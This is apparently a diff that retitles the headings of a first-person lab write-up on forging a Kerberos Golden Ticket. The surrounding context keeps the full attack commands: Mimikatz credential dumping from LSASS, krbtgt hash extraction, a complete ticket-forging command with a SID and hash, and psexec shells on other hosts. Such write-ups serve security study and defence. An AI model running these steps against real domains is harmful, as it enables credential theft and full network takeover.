@@ -21,7 +21,7 @@
 - [Step 7 — Accessing Victim Machine File System](#step-7--accessing-victim-machine-file-system)
 - [Step 8 — Getting a Shell on the Victim Machine](#step-8--getting-a-shell-on-the-victim-machine)
 
-# What is Golden Ticket ?
+# What is a Golden Ticket ?
 
 A Golden Ticket is a forged Kerberos ticket that gives an attacker unlimited access to every resource in the domain — forever, or until the krbtgt account password is changed twice.
 The whole attack is based on one thing — the krbtgt account. This is a special account in Active Directory that signs every single Kerberos ticket in the domain. If I get its password hash, I can forge my own tickets and pretend to be any user, including Domain Admin — without ever touching the real account.
@@ -34,7 +34,7 @@ The whole attack is based on one thing — the krbtgt account. This is a special
 - It is very hard to detect since it looks like a normal Kerberos ticket
 - Even resetting the Administrator password does not stop it — only changing krbtgt password twice does
 
-## What I Needed Before Starting
+## Prerequisites
 
 To perform this attack, I needed the following prerequisites:
 
@@ -57,13 +57,13 @@ Golden Tickets do not need network access to generate — everything is done loc
 Detection is difficult because the ticket looks completely legitimate to the DC
 
 
-# Step 1 - Download mimikatz_trunk.zip in kali
+## Step 1 — Downloading Mimikatz in Kali
 
 First I downloaded mimikatz_trunk.zip from github in kali and then transfer it to dc.
 Then I unzip mimikatz_trunk.zip file on dc. 
 
 
-# Step 2 - run mimikatz.exe on dc terminal
+## Step 2 — Running Mimikatz on the DC
 
 After that I open cmd on dc. My `Downloads` folder contains `mimikatz.exe` file. So I run mimikatz.exe file in this location.
 
@@ -97,7 +97,7 @@ Privilege '20' OK
 
 `Privilege '20' OK` means Mimikatz successfully got **SeDebugPrivilege** — this allows it to access memory of other processes including LSASS which holds all the credentials.
 
-# Step 3 - Dumping Credentials from Memory
+## Step 3 — Dumping Credentials from Memory
 
 Now I need Domain SID and krbtgt NTLM Hash.
 
@@ -141,7 +141,7 @@ Got the Administrator NTLM hash sitting right in memory. No cracking needed — 
   <img src="/writeups/golden ticket/images/step3.png" width="600">
 </p>
 
-## Step - 4 Dumping krbtgt Hash
+## Step 4 — Dumping the krbtgt Hash
 
 ```bash
 mimikatz # lsadump::lsa /inject /name:krbtgt
@@ -162,7 +162,7 @@ Instead of dumping all accounts like `lsadump::lsa /patch`, this command goes af
   <img src="/writeups/golden ticket/images/step4.png" width="600">
 </p>
 
-## Step - 5 Generating and Injecting the Golden Ticket
+## Step 5 — Generating and Injecting the Golden Ticket
 
 ```bash
 kerberos::golden /user:Administrator /domain:readteambd.local /sid:S-1-5-21-2745015721-426968701-4006811760 /krbtgt:5f8156b8f557baae7cd069ac724e1959 /id:500 /ptt
@@ -213,7 +213,7 @@ Golden ticket for 'Administrator @ readteambd.local' successfully submitted for 
   <img src="/writeups/golden ticket/images/step5.png" width="600">
 </p>
 
-## Step - 6 Opening a CMD Shell with the Golden Ticket
+## Step 6 — Opening a CMD Shell with the Golden Ticket
 
 ```bash
 mimikatz # misc::cmd
@@ -234,7 +234,7 @@ psexec \\READTEAMBD-DC cmd.exe
 net view /domain
 ```
 
-## Step - 7 Accessing Victim Machine File System
+## Step 7 — Accessing Victim Machine File System
 
 ```cmd
 dir \\192.168.5.142\c$
@@ -271,7 +271,7 @@ dir \\192.168.5.142\c$
 
 If this command returns the contents of the C drive, it means the Golden Ticket worked. I am accessing another machine in the domain as Domain Administrator — without ever using a real password. Just the forged ticket was enough to get in.
 
-## Step -8 Getting a Shell on the Victim Machine
+## Step 8 — Getting a Shell on the Victim Machine
 
 ```cmd
 psexec \\192.168.5.142 cmd.exe
